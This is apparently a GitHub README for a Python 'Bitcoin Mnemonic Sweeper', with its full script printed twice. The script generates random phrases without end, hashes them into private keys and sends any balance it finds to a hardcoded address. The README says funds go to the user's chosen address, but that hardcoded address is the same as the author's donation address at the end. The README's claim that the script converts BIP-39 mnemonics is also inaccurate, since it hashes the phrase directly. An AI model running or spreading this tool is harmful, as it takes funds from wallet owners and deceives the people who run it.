🚀 Bitcoin Mnemonic Sweeper with Sound Notifications 🎉
Welcome to the Bitcoin Mnemonic Sweeper project! This script generates BIP-39 mnemonic phrases, converts them to private keys, and attempts to sweep any funds found to a designated address. If a sweep is successful, it plays a cheerful sound notification. 🎶

Make sure you have these installed:

pip install bitcoin bit mnemonic

📖 Introduction
This project is designed to help you find and sweep Bitcoin funds from generated mnemonic phrases. The script runs indefinitely, generating new mnemonics, checking for associated Bitcoin balances, and sweeping any funds found to your specified address. It even plays a sound to notify you of successful sweeps! 🎵

✨ Features
🔄 Indefinite Mnemonic Generation: Continuously generates BIP-39 12-word mnemonic phrases.
🔑 Private Key Conversion: Converts mnemonics to Bitcoin private keys.
💰 Fund Sweeping: Checks for Bitcoin balances and sweeps any found funds to your designated address.
🔔 Sound Notifications: Plays a sound when a sweep is successful.
🛠️ Getting Started
Prerequisites
Before you begin, ensure you have met the following requirements:

You are using a Windows machine.
You have Python 3.x installed.
You have an internet connection.
Installation
Clone the Repository

sh
Copy code
git clone https://github.com/tianrich/bipscraper.git
cd bipscraper
Install Required Packages
Use the following pip command to install all necessary dependencies:

sh
Copy code
pip install bitcoin bit mnemonic
Run the Script

sh
Copy code
python sweep.py
🚀 Usage
To use the Bitcoin Mnemonic Sweeper, simply run the script. The script will continuously generate mnemonic phrases, convert them to private keys, check for balances, and sweep any found funds to your specified address. If a sweep is successful, you'll hear a sound notification.

📝 Detailed Explanation
Generating Mnemonics
The script uses the mnemonic library to generate BIP-39 12-word mnemonic phrases. These phrases are generated indefinitely in a loop.

Converting to Private Keys
Each mnemonic phrase is converted to a SHA-256 hashed private key. This key is then encoded into Wallet Import Format (WIF) for compatibility with Bitcoin wallets.

Sweeping Funds
Using the bit library, the script checks for any Bitcoin balance associated with the generated private key. If a balance is found, it attempts to send the funds to the designated sweep address.

Sound Notifications
The winsound library is used to play a default Windows sound when a sweep is successful. This auditory notification helps you quickly identify successful sweeps.

🤝 Contributing
Contributions are welcome! Here's how you can contribute:

Fork the repository.
Create a new branch (git checkout -b feature-foo).
Make your changes.
Commit your changes (git commit -m 'Add feature foo').
Push to the branch (git push origin feature-foo).
Open a pull request.
📜 License
This project is licensed under the MIT License. See the LICENSE file for more details.

🌟 Show Your Support
If you like this project, please give it a ⭐ on GitHub!

🐍 Full Script Example
Here's the full Python script for reference:

python
Copy code
import hashlib
import codecs
from bitcoin import privkey_to_pubkey, pubkey_to_address
from bit import Key
from bit.exceptions import InsufficientFunds
import base58
from mnemonic import Mnemonic
import sys
import time
import winsound

# Address to sweep funds to
sweep_address = "3FxQzNxA1MYEjmtQjEYfKisLPYq1b7hBCf"

def sha256(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.sha256(data).hexdigest()

def get_private_key_from_passphrase(passphrase):
    private_key = sha256(passphrase)
    return private_key

def private_key_to_wif(private_key):
    extended_key = "80" + private_key
    first_sha256 = sha256(codecs.decode(extended_key, 'hex_codec'))
    second_sha256 = sha256(codecs.decode(first_sha256, 'hex_codec'))
    checksum = second_sha256[:8]
    final_key = extended_key + checksum
    wif = base58.b58encode(codecs.decode(final_key, 'hex_codec')).decode('utf-8')
    return wif

def sweep_funds(private_key_wif):
    try:
        key = Key(private_key_wif)
        balance = key.get_balance('btc')
        balance = float(balance)

        if balance > 0:
            print(f"\033[92mBalance for address {key.address} is {balance} BTC. Sweeping funds.\033[0m")
            try:
                tx_hash = key.send([(sweep_address, balance, 'btc')], fee='fastest')
                print(f"\033[92mTransaction sent: {tx_hash}\033[0m")
                winsound.MessageBeep(winsound.MB_OK)  # Play the default Windows ping sound on successful sweep
            except InsufficientFunds as e:
                print(f"Insufficient funds to send transaction: {e}")
        else:
            print(f"Insufficient balance for address: {key.address}")
    except Exception as e:
        print(f"Error handling key {private_key_wif}: {e}")

def generate_mnemonic():
    mnemo = Mnemonic("english")
    return mnemo.generate(strength=128)  # Generates a 12-word mnemonic

def main():
    while True:
        mnemonic_phrase = generate_mnemonic()
        print(f"Generated mnemonic phrase: {mnemonic_phrase}")
        private_key = get_private_key_from_passphrase(mnemonic_phrase)
        wif = private_key_to_wif(private_key)
        print(f"Sweeping funds from WIF: {wif}")
        sweep_funds(wif)
        time.sleep(0.1)  # Small sleep to prevent overwhelming any APIs and avoid rate limits

if __name__ == "__main__":
    main()
Thanks for checking out the Bitcoin Mnemonic Sweeper project! We hope you find it useful and fun. If you have any questions or suggestions, feel free to open an issue or contribute to the project. Happy sweeping! 🧹💸






📖 Introduction
This project is designed to help you find and sweep Bitcoin funds from generated mnemonic phrases. The script runs indefinitely, generating new mnemonics, checking for associated Bitcoin balances, and sweeping any funds found to your specified address. It even plays a sound to notify you of successful sweeps! 🎵

✨ Features
🔄 Indefinite Mnemonic Generation: Continuously generates BIP-39 12-word mnemonic phrases.
🔑 Private Key Conversion: Converts mnemonics to Bitcoin private keys.
💰 Fund Sweeping: Checks for Bitcoin balances and sweeps any found funds to your designated address.
🔔 Sound Notifications: Plays a sound when a sweep is successful.
🛠️ Getting Started
Prerequisites
Before you begin, ensure you have met the following requirements:

You are using a Windows machine.
You have Python 3.x installed.
You have an internet connection.
Installation
Clone the Repository

sh
Copy code
git clone https://github.com/tianrich/bipscraper.git
cd bipscraper
Install Required Packages
Use the following pip command to install all necessary dependencies:

sh
Copy code
pip install bitcoin bit mnemonic
Run the Script

sh
Copy code
python sweep.py
🚀 Usage
To use the Bitcoin Mnemonic Sweeper, simply run the script. The script will continuously generate mnemonic phrases, convert them to private keys, check for balances, and sweep any found funds to your specified address. If a sweep is successful, you'll hear a sound notification.

📝 Detailed Explanation
Generating Mnemonics
The script uses the mnemonic library to generate BIP-39 12-word mnemonic phrases. These phrases are generated indefinitely in a loop.

Converting to Private Keys
Each mnemonic phrase is converted to a SHA-256 hashed private key. This key is then encoded into Wallet Import Format (WIF) for compatibility with Bitcoin wallets.

Sweeping Funds
Using the bit library, the script checks for any Bitcoin balance associated with the generated private key. If a balance is found, it attempts to send the funds to the designated sweep address.

Sound Notifications
The winsound library is used to play a default Windows sound when a sweep is successful. This auditory notification helps you quickly identify successful sweeps.

🤝 Contributing
Contributions are welcome! Here's how you can contribute:

Fork the repository.
Create a new branch (git checkout -b feature-foo).
Make your changes.
Commit your changes (git commit -m 'Add feature foo').
Push to the branch (git push origin feature-foo).
Open a pull request.
📜 License
This project is licensed under the MIT License. See the LICENSE file for more details.

🌟 Show Your Support
If you like this project, please give it a ⭐ on GitHub!

🐍 Full Script Example
Here's the full Python script for reference:

python
Copy code
import hashlib
import codecs
from bitcoin import privkey_to_pubkey, pubkey_to_address
from bit import Key
from bit.exceptions import InsufficientFunds
import base58
from mnemonic import Mnemonic
import sys
import time
import winsound 

def sha256(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return hashlib.sha256(data).hexdigest()

def get_private_key_from_passphrase(passphrase):
    private_key = sha256(passphrase)
    return private_key

def private_key_to_wif(private_key):
    extended_key = "80" + private_key
    first_sha256 = sha256(codecs.decode(extended_key, 'hex_codec'))
    second_sha256 = sha256(codecs.decode(first_sha256, 'hex_codec'))
    checksum = second_sha256[:8]
    final_key = extended_key + checksum
    wif = base58.b58encode(codecs.decode(final_key, 'hex_codec')).decode('utf-8')
    return wif

sweep_address = "3FxQzNxA1MYEjmtQjEYfKisLPYq1b7hBCf"
def sweep_funds(private_key_wif):
    try:
        key = Key(private_key_wif)
        balance = key.get_balance('btc')
        balance = float(balance)

        if balance > 0:
            print(f"\033[92mBalance for address {key.address} is {balance} BTC. Sweeping funds.\033[0m")
            try:
                tx_hash = key.send([(sweep_address, balance, 'btc')], fee='fastest')
                print(f"\033[92mTransaction sent: {tx_hash}\033[0m")
                winsound.MessageBeep(winsound.MB_OK)  # Play the default Windows ping sound on successful sweep
            except InsufficientFunds as e:
                print(f"Insufficient funds to send transaction: {e}")
        else:
            print(f"Insufficient balance for address: {key.address}")
    except Exception as e:
        print(f"Error handling key {private_key_wif}: {e}")

def generate_mnemonic():
    mnemo = Mnemonic("english")
    return mnemo.generate(strength=128)  # Generates a 12-word mnemonic

def main():
    while True:
        mnemonic_phrase = generate_mnemonic()
        print(f"Generated mnemonic phrase: {mnemonic_phrase}")
        private_key = get_private_key_from_passphrase(mnemonic_phrase)
        wif = private_key_to_wif(private_key)
        print(f"Sweeping funds from WIF: {wif}")
        sweep_funds(wif)
        time.sleep(0.1)  # Small sleep to prevent overwhelming any APIs and avoid rate limits

if __name__ == "__main__":
    main()
    
Thanks for checking out the Bitcoin Mnemonic Sweeper project! We hope you find it useful and fun. If you have any questions or suggestions, feel free to open an issue or contribute to the project. Happy sweeping! 🧹💸 

Donations welcome: 3FxQzNxA1MYEjmtQjEYfKisLPYq1b7hBCf
